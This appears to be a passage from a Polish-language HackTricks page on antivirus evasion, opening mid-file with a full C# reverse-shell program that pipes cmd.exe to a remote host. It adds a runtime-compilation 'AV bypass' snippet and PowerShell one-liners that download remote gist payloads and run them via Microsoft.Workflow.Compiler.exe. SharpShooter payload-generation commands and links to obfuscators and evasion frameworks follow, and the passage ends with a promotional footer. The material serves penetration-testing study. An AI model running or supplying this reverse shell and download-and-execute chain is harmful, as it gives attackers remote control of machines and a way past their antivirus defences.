using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Użycie kompilatora C#

Aby obejść ochronę przed antywirusami, można skorzystać z kompilatora C#. 

```csharp
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using Microsoft.CSharp;

namespace AVBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            string code = @"
                using System;

                namespace AVBypass
                {
                    class Program
                    {
                        static void Main(string[] args)
                        {
                            Console.WriteLine(""Hello, World!"");
                        }
                    }
                }
            ";

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = "AVBypass.exe";

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                Process.Start("AVBypass.exe");
            }
        }
    }
}
```

Ten kod używa kompilatora C# do generowania pliku wykonywalnego, który może obejść ochronę antywirusową.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[Plik REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[Plik REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
